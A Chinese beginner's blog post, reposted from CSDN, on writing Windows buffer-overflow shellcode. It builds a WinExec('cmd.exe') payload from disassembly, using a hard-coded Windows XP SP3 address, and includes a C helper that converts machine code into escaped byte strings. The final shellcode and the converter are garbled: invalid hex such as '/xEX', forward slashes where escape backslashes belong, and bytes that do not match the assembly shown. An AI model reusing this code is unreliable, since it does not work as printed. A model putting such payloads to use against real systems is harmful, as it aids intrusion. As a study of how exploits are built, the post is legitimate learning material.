---
layout: post
categories: shellcode
title: Shell初级入门程序
date: 2018-04-11 13:12:45 +0800
description: shellcode 进行服务器的渗透
keywords: shellcode linux
---

## 前言

很久没有写博客了，今天写写一个以前没有写过的话题，缓冲区溢出shellcode编写。

我是菜鸟，以前没有写过shellcode，最近也在忙着网络的渗透，栈溢出也是零零碎碎的看到一些知识，大牛飘过，菜鸟言论仅供娱乐。

大家同是菜鸟的人可以看看，我是站在初学者的角度写这篇文章的，所以初学者应该比较容易理解。

对于一些复杂的shellcodet我们暂且先不谈，我们先来看看自己编写一个打开cmd窗口的shellcode。其实黑客防线上有位大神执笔写了一系列exploit的编写，有兴趣的人自己去看看。

## 首先我们需要了解一下windows的运行机制。我们先写一个简单的开启本地cmd窗口的程序：

```c
#include<windows.h>  
Void main()  
{  
   WinExec("cmd.exe",1);  
} 
```


### 在Visual C++上按F10进入反汇编代码:

```c
:#include”windows.h”  
2:void main()  
3:    {  
00401010   push        ebp  
00401011   mov         ebp,esp  
00401013   sub         esp,40h  
00401016   push        ebx  
00401017   push        esi  
00401018   push        edi  
00401019   lea         edi,[ebp-40h]  
0040101C   mov         ecx,10h  
00401021   mov         eax,0CCCCCCCCh  
00401026   rep stos    dword ptr [edi]  
4:        WinExec("cmd.exe",1);  
00401028   mov         esi,esp  
0040102A   push        1  
0040102C   push        offset string "cmd.exe" (0041f01c)  
00401031   call        dword ptr [__imp__WinExec@8 (0042413c)]  
00401037   cmp         esi,esp  
00401039   call        __chkesp (00401070)  
5:    }  
```


通过这个程序我们可以清楚的看到计算机在调用WinExec函数的时候是先把两个参数从右至左一次压入栈，然后调用call函数转到WinExec的地址去。但是要注意的是call函数除了实现地址的跳转还有一点就是把当前的EIP压入栈。

对于shellcode是机器码，大多数人看到都会晕乎乎的，但是不用怕，我们所要做的工作不是用机器码写这一大堆东西，这些计算机已经为我们做的很好了，我们所要做的就是用汇编甚至是高级语言写下我们要实现的代码。




但目前其实目的已经很明确，我们要调用WinExec函数就要知道在不同系统中WinExec函数所在的地址，那么用什么方法知道这个函数所在的地址呢？这里我介绍一种非常简便的办法，使用vc自带的depends工具。打开Depends，随便拖一个PE文件进去如下图：

![](http://112firshme11224.test.upcdn.net/demos/feb1aef7-5ae0-43d1-bdbf-b234589fa766.jpeg)


我们可以看到KERNEL.DLL的入口地址是0x7c800000而WinExec的入口地址是0x0006250D那么WinExec的地址就出来了两个相加得到0x7C86250D，这个方法是不是很简单？另外本菜鸟使用的是windows XP sp3不同的系统可能有所不同。

有了入口地址，我们可以用汇编来编写我们的shellcode，

```c
#include<windows.h>  
void main()  
{  
    _asm  
    {  
        push ebp  
        mov ebp,esp  
        xor edi,edi  
        push edi  
        sub esp,04h  
        mov [ebp-08h],63h  
        mov [ebp-07h],6Dh  
        mov [ebp-06h],64h  
        mov [ebp-05h],2Eh  
        mov [ebp-04h],65h  
        mov [ebp-03h],78h  
        mov [ebp-02h],65h  
        push 1         //压入第一个参数  
        lea eax,[ebp-08h]           
        push eax           //压入第二个参数  
        mov edx,0x7C86250D  
        call edx            //调用WinExec  
        leave  
    };  
}  

```

按F10进入反汇编调试器中，在按Alt+8看到汇编代码，此时并没有机器码啊，别着急，在空白的地方右击出现的下拉菜单中选中Code Byte一项。看看出现了什么？在每一行汇编代码前出现了机器码！如下图

![](http://112firshme11224.test.upcdn.net/demos/0d6ce28d-d9c8-47b8-b21b-1eeb923c9754.bmp)

下面要做的工作就是把这些机器码抄下来了，这个是体力活。直接抄在一起比如：558BEC83EC……那么我们还要在每两个字母前手动添加/x么？当然不用，写一个小程序，一劳永逸：

```c
#include "stdio.h"  
#include "stdlib.h"  
int main()  
{  
    FILE *fp1=NULL,*fp2=NULL;  
    char ch,filename[20]={0};  
    printf("请输入文件路径：(注意字符转义)/n");  
    scanf("%s",filename);  
    if((fp1=fopen(filename,"rb"))==NULL)  
    {  
        printf("不能读取文件！/n");  
        exit(0);  
    }  
    if((fp2=fopen("shellcode.txt","w+"))==NULL)  
    {  
        printf("不能写入文件！/n");  
        exit(0);  
    }  
    while (!feof(fp1))  
    {  
        ch=fgetc(fp1);  
        fputc('//',fp2);  
        fputc('x',fp2);  
        fputc(ch,fp2);  
        ch=fgetc(fp1);  
        fputc(ch,fp2);  
    }  
    printf("转换成功！");  
    fclose(fp1);  
    fclose(fp2);  
    return 0;  
      
}  
```

最终转换的shellcode就是

```c
/x55/x8B/xEX/x83/xEC/x40/x53/x56/x57/x8D/x7D/xC0/xB9/x10/x11/x11/x11/xB8/xCC/xCC/xCC/xCC/xF3/x1B/x55/x8B/xEC/x33/xFF/x57/x83/xEC/x04/xC6/x45/xF8/x63/xC6/x45/xF9/x6D/xC6/x45/xFA/x64/xC6/x45/xFB/x2E/xC6/x45/xFC/x65/xC6/x45/xFD/x78/xC6/x45/xFE/x65/x6A/x01/x8D/x45/xF8/x50/xBA/x0D/x25/x86/x7C/xFF/xD2/xC9
```
到这里该讲的都讲完了，还是那一句话，菜鸟言论，大牛飘过。。。

### 原文：https://blog.csdn.net/yiyefangzhou24/article/details/6440239






转载请注明出处，本文采用 [CC4.0](http://creativecommons.org/licenses/by-nc-nd/4.0/) 协议授权
